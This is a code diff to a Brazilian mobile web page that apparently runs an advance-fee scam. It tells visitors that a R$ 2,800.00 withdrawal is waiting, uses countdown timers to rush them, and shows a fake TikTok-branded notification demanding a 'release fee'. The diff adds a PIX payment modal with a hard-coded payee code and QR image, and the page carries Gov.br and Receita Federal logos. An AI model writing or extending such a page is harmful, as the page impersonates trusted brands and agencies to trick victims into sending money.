@@ -1,6 +1,6 @@
 import { createFileRoute, Link } from "@tanstack/react-router";
 import { useEffect, useState } from "react";
-import { ChevronLeft, Clock, Lock } from "lucide-react";
+import { ChevronLeft, Clock, Lock, Copy, Loader2 } from "lucide-react";
 import coinP from "@/assets/coin-p.png";
 import govbr from "@/assets/govbr-logo.webp";
 import receita from "@/assets/receita-federal.webp";
@@ -48,8 +48,15 @@ const TESTIMONIALS = [
   },
 ];
 
+const PIX_CODE =
+  "00020101021226820014br.gov.bcb.pix2560qrcode.a55scd.com.br/v1/54fe3206-7e6a-46b8-bd06-5a996e7870f52040000530398658025802BR5914AJUDASOLIDARIA6008SAOPAULO62070503***6304A1B2";
+
 function ConfirmarSaque() {
   const [seconds, setSeconds] = useState(6 * 60 + 17);
+  const [showPix, setShowPix] = useState(false);
+  const [pixSeconds, setPixSeconds] = useState(10 * 60);
+  const [showToast, setShowToast] = useState(false);
+  const [copied, setCopied] = useState(false);
 
   useEffect(() => {
     const id = setInterval(
@@ -59,8 +66,37 @@ function ConfirmarSaque() {
     return () => clearInterval(id);
   }, []);
 
+  useEffect(() => {
+    if (!showPix) return;
+    const id = setInterval(
+      () => setPixSeconds((s) => (s > 0 ? s - 1 : 0)),
+      1000,
+    );
+    return () => clearInterval(id);
+  }, [showPix]);
+
+  const openPix = () => {
+    setShowPix(true);
+    setShowToast(true);
+    window.setTimeout(() => setShowToast(false), 6000);
+  };
+
+  const copyCode = async () => {
+    try {
+      await navigator.clipboard.writeText(PIX_CODE);
+    } catch {
+      // ignore
+    }
+    setCopied(true);
+    window.setTimeout(() => setCopied(false), 2000);
+  };
+
   const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
   const ss = String(seconds % 60).padStart(2, "0");
+  const pixMm = String(Math.floor(pixSeconds / 60)).padStart(2, "0");
+  const pixSs = String(pixSeconds % 60).padStart(2, "0");
+
+  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=0&data=${encodeURIComponent(PIX_CODE)}`;
 
   return (
     <div className="min-h-screen bg-[#f5f5f5] max-w-[430px] mx-auto pb-10">
@@ -172,7 +208,10 @@ function ConfirmarSaque() {
         </div>
 
         {/* CTA */}
-        <button className="w-full h-[54px] bg-pink text-white font-extrabold text-[14px] rounded-[12px] flex items-center justify-center gap-2 shadow-lg shadow-pink/30 active:scale-[0.98] transition-transform">
+        <button
+          onClick={openPix}
+          className="w-full h-[54px] bg-pink text-white font-extrabold text-[14px] rounded-[12px] flex items-center justify-center gap-2 shadow-lg shadow-pink/30 active:scale-[0.98] transition-transform"
+        >
           <Lock size={17} />
           CONFIRMAR E LIBERAR R$ 2.800,00
         </button>
@@ -269,6 +308,92 @@ function ConfirmarSaque() {
           </p>
         </div>
       </div>
+
+      {/* TikTok-style notification toast */}
+      <div
+        className={`fixed top-0 left-1/2 -translate-x-1/2 w-full max-w-[430px] z-[120] px-3 pt-3 transition-all duration-500 ${
+          showToast ? "translate-y-0 opacity-100" : "-translate-y-full opacity-0"
+        }`}
+      >
+        <div className="bg-[#1a1a1a]/95 backdrop-blur-md text-white rounded-[14px] p-3.5 flex gap-3 shadow-2xl">
+          <div className="w-10 h-10 rounded-[8px] bg-black flex items-center justify-center flex-shrink-0">
+            <svg viewBox="0 0 24 24" className="w-6 h-6" fill="none">
+              <path
+                d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5.8 20.1a6.34 6.34 0 0 0 10.86-4.43V8.69a8.16 8.16 0 0 0 4.77 1.52V6.77a4.85 4.85 0 0 1-1.84-.08z"
+                fill="#fff"
+              />
+              <path
+                d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-1.45c.38 2.14 1.65 3.97 3.42 5.05v-.36z"
+                fill="#25F4EE"
+              />
+              <path
+                d="M9.45 12.77a2.89 2.89 0 0 0-1.34 5.46 2.88 2.88 0 0 1-.59-1.75 2.89 2.89 0 0 1 2.89-2.89c.3 0 .59.05.88.13v-3.5a6.85 6.85 0 0 0-1-.05h-.16v2.74c-.22-.08-.45-.13-.68-.14z"
+                fill="#FE2C55"
+              />
+            </svg>
+          </div>
+          <div className="flex-1 min-w-0">
+            <div className="flex items-center justify-between">
+              <p className="text-[13px] font-semibold">
+                TikTok <span className="text-white/50 font-normal">· agora</span>
+              </p>
+            </div>
+            <p className="text-[13px] font-bold mt-0.5">Transferência pendente</p>
+            <p className="text-[12px] text-white/80 leading-snug mt-0.5">
+              Transferência pendente de R$ 2.800,00 aguardando pagamento da
+              taxa de liberação.
+            </p>
+          </div>
+        </div>
+      </div>
+
+      {/* PIX modal */}
+      {showPix && (
+        <div className="fixed inset-0 z-[100] flex items-center justify-center px-5 bg-black/70 backdrop-blur-sm">
+          <div className="w-full max-w-[360px] bg-[#1c1c1c] rounded-[20px] p-6 text-white">
+            <p className="text-center text-[12px] font-bold tracking-[0.18em] text-white/80">
+              PAGUE COM PIX
+            </p>
+
+            <div className="mt-5 bg-white p-3 rounded-[14px] mx-auto w-[230px] h-[230px] flex items-center justify-center">
+              <img
+                src={qrUrl}
+                alt="QR Code PIX"
+                width={210}
+                height={210}
+                className="w-full h-full object-contain"
+              />
+            </div>
+
+            <p className="text-center text-white/70 text-[12px] mt-4">
+              Escaneie o QR Code ou copie o código abaixo:
+            </p>
+
+            <div className="mt-3 bg-black/40 border border-white/10 rounded-[10px] p-3">
+              <p className="text-white/80 text-[11px] leading-snug break-all font-mono">
+                {PIX_CODE}
+              </p>
+            </div>
+
+            <button
+              onClick={copyCode}
+              className="w-full h-[48px] mt-4 bg-pink text-white font-extrabold text-[14px] rounded-[12px] flex items-center justify-center gap-2 active:scale-[0.98] transition-transform"
+            >
+              <Copy size={16} />
+              {copied ? "Código copiado!" : "Copiar código PIX"}
+            </button>
+
+            <p className="text-center text-pink text-[13px] font-bold mt-3 tabular-nums">
+              Expira em: {pixMm}:{pixSs}
+            </p>
+
+            <div className="flex items-center justify-center gap-2 mt-3 text-white/70 text-[12px]">
+              <Loader2 size={14} className="animate-spin text-pink" />
+              <span>Aguardando confirmação...</span>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
